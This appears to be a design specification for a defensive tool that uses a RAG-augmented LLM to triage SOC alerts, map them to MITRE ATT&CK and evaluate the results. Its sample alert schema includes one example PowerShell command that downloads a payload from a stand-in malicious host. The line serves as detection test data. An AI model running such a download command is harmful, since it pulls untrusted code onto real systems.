# LLM Alert Investigator - Project Specification

## 1. Project Overview

**Project Name:** LLM Alert Investigator
**Type:** AI/ML-powered SOC Alert Investigation Tool
**Core Functionality:** Automated security alert analysis using RAG-augmented LLM to map alerts to MITRE ATT&CK framework, generate investigation narratives, and recommend next steps for SOC analysts.
**Target Users:** SOC Level 2 Analysts, Security Operations Teams

## 2. Problem Statement

Security Operations Centers (SOCs) face alert fatigue from SIEM systems like Splunk/Elastic. Rule-based detection generates numerous alerts requiring human analysis. This tool simulates SOC L2 analysis tasks, performing in seconds what traditionally takes minutes per alert.

## 3. Architecture

### System Design
```
┌─────────────────────────────────────────────────────────────┐
│                     Alert Investigator                       │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────┐    ┌──────────────┐    ┌───────────────┐  │
│  │  Preprocessor│───▶│  RAG Retrieval│───▶│  LLM Analysis │  │
│  │  (Normalize) │    │  (FAISS +     │    │  (GPT-4o +    │  │
│  │              │    │   MITRE KB)   │    │   Chain)      │  │
│  └─────────────┘    └──────────────┘    └───────────────┘  │
│                                                   │         │
│                                                   ▼         │
│  ┌─────────────┐    ┌──────────────┐    ┌───────────────┐  │
│  │  Evaluator  │◀───│    JSON      │◀───│   Response    │  │
│  │  (Metrics)  │    │   Output     │    │   Formatter   │  │
│  └─────────────┘    └──────────────┘    └───────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

### Tech Stack
- **Language:** Python 3.11
- **LLM Framework:** LangChain >= 0.2
- **Vector Store:** FAISS (CPU)
- **LLM Provider:** OpenAI GPT-4o
- **Embeddings:** OpenAI text-embedding-3-small
- **MITRE Data:** mitreattack-python
- **UI:** Streamlit
- **Evaluation:** scikit-learn, pandas, matplotlib

## 4. Folder Structure

```
llm-alert-investigator/
├── data/
│   ├── sample_alerts/           # JSON alerts for testing
│   │   ├── benign_samples.json
│   │   └── attack_samples.json
│   ├── mitre_attack_kb/          # FAISS vector store (generated)
│   └── ground_truth_labels.csv   # Manual MITRE labels for evaluation
├── src/
│   ├── __init__.py
│   ├── preprocessor.py           # Alert normalization & enrichment
│   ├── kb_builder.py             # Build MITRE ATT&CK vector store
│   ├── investigator.py           # Core LLM chain + RAG logic
│   ├── evaluator.py              # Evaluation metrics
│   └── app.py                    # Streamlit UI
├── prompts/
│   └── investigation_prompt.txt  # Main investigation prompt template
├── notebooks/
│   └── 01_exploration.ipynb      # Data exploration notebook
├── tests/
│   ├── __init__.py
│   ├── test_preprocessor.py
│   ├── test_investigator.py
│   └── test_evaluator.py
├── .env.example
├── requirements.txt
├── pyproject.toml
└── README.md
```

## 5. Functionality Specification

### 5.1 Alert Preprocessor (src/preprocessor.py)

**Class:** `AlertPreprocessor`

**Methods:**
- `normalize(alert: dict) -> dict` - Convert various SIEM formats to canonical format
- `enrich(alert: dict) -> dict` - Add derived fields (IOC extraction, threat intel hints)
- `to_text(alert: dict) -> str` - Convert alert to text for embedding

**Canonical Alert Format:**
```python
{
    "timestamp": "2024-01-15T10:30:00Z",
    "src_ip": "192.168.1.100",
    "dst_ip": "10.0.0.50",
    "src_port": 54321,
    "dst_port": 443,
    "event_type": "network_connection",
    "process": "powershell.exe",
    "command_line": "Invoke-WebRequest -Uri http://malicious.com/payload.exe",
    "file_hash": "abc123...",
    "severity": "high",
    "raw_log": "..."
}
```

### 5.2 MITRE ATT&CK KB Builder (src/kb_builder.py)

**Class:** `MITREKnowledgeBaseBuilder`

**Methods:**
- `build_from_mitre(mitre_data_path: str) -> FAISS` - Build vector store from MITRE ATT&CK data
- `save(path: str)` - Persist FAISS index to disk
- `load(path: str) -> FAISS` - Load existing FAISS index

**Document Schema:**
```python
{
    "technique_id": "T1059.001",
    "technique_name": "PowerShell",
    "tactic": "Execution",
    "description": "...",
    "detection": "...",
    "data_sources": ["..."],
    "short_description": "Abuse of PowerShell for command execution"
}
```

### 5.3 Alert Investigator (src/investigator.py)

**Class:** `AlertInvestigator`

**Design Parameters:**
- `temperature=0` - Deterministic output
- `k=5` - Number of MITRE techniques to retrieve
- `model=gpt-4o` - LLM model

**Methods:**
- `investigate(alert: dict) -> dict` - Main investigation method
- `_format_alert(alert: dict) -> str` - Format alert for prompt
- `_format_techniques(techniques: list) -> str` - Format retrieved techniques

**Output Schema:**
```python
{
    "mitre_mapping": [
        {
            "tactic": "Execution",
            "technique_id": "T1059.001",
            "technique_name": "PowerShell",
            "confidence": 0.92
        }
    ],
    "narrative": "The alert indicates suspicious PowerShell execution...",
    "next_steps": [
        "Check process parent for legitimacy",
        "Analyze network connections from the source IP"
    ],
    "severity": "high"
}
```

### 5.4 Evaluator (src/evaluator.py)

**Functions:**
- `evaluate_mitre_mapping(predictions: list, ground_truth: list) -> dict`
  - Technique accuracy (Top-1, Top-3)
  - Average confidence scores
- `evaluate_narrative_quality(narratives: list, judge_llm) -> list`
  - LLM-as-judge scoring (1-5 scale)
  - Dimensions: accuracy, completeness, actionability

### 5.5 Streamlit UI (src/app.py)

**Features:**
- Single alert input (JSON editor)
- Batch alert processing
- Results display with MITRE mapping visualization
- Ground truth comparison mode
- Evaluation metrics display

## 6. Prompt Design

### Investigation Prompt Template
```
You are a SOC L2 analyst. Analyze this security alert and provide:
1. MITRE ATT&CK mapping (tactic + technique ID + confidence 0-1)
2. Investigation narrative explaining what likely happened
3. Recommended next steps for the analyst

ALERT: {alert}
RELEVANT MITRE TECHNIQUES (from knowledge base): {mitre_context}

Respond in JSON format:
{
  "mitre_mapping": [{"tactic": "...", "technique_id": "T...", "technique_name": "...", "confidence": 0.0}],
  "narrative": "...",
  "next_steps": ["...", "..."],
  "severity": "low|medium|high|critical"
}
```

## 7. Dataset Options

### Primary: Synthetic Alerts
Generated using GPT-4o with controlled MITRE technique coverage

### Secondary: CICIDS2017/2018
Network intrusion dataset requiring feature-to-alert conversion

### Ground Truth
Minimum 100-200 manually labeled alerts for meaningful metrics

## 8. Evaluation Metrics

| Metric | Description | Target |
|--------|-------------|--------|
| Top-1 Accuracy | Correct technique as top prediction | > 80% |
| Top-3 Accuracy | Correct technique in top 3 predictions | > 95% |
| Avg Confidence | Mean confidence of correct predictions | > 0.75 |
| Narrative Quality | LLM-as-judge score (1-5) | > 4.0 |

## 9. Design Decisions for Paper

1. **temperature=0**: Ensures deterministic, reproducible results for paper evaluation
2. **k=5**: Ablation study parameter - balances context window vs. relevance
3. **RAG vs No-RAG**: Compare LLM-only vs RAG-augmented for ablation study
4. **LLM-as-Judge**: Standard technique for evaluating generative outputs

## 10. Limitations

- Hallucination risk in narrative generation
- Latency dependent on LLM API response time
- Cost per alert based on token usage
- MITRE KB coverage limited to techniques in knowledge base

## 11. Future Work

- Multi-level SOC escalation (L1 → L2 → L3)
- Integration with real SIEM platforms
- Custom fine-tuned model for security domain
- Feedback loop for continuous improvement